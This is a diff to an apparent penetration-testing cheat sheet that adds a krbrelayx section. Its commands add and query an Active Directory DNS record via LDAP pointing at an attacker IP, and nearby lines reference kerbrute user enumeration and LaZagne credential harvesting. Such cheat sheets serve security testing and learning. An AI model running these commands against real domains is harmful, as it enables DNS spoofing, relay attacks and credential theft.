@@ -2103,6 +2103,17 @@ kerbrute userenum /path/to/list/of/usernames -d domain.here --dc DC_IP_here
 
 
 
+## KRBRELAYX
+```bash
+# add DNS entry via LDAP (AD)
+python3 /path/to/krbrelayx/dnstool.py -u "domain_here\user_name_here" -p password_here -r site_name_here.domain.here -a add -d attacker_IP_here target_IP
+
+# query DNS entry via LDAP (AD)
+python3 /path/to/krbrelayx/dnstool.py -u "domain_here\user_name_here" -p password_here -r site_name_here.domain.here -a query target_IP
+```
+
+
+
 ## LAZAGNE
 ```powershell
 # launch all modules
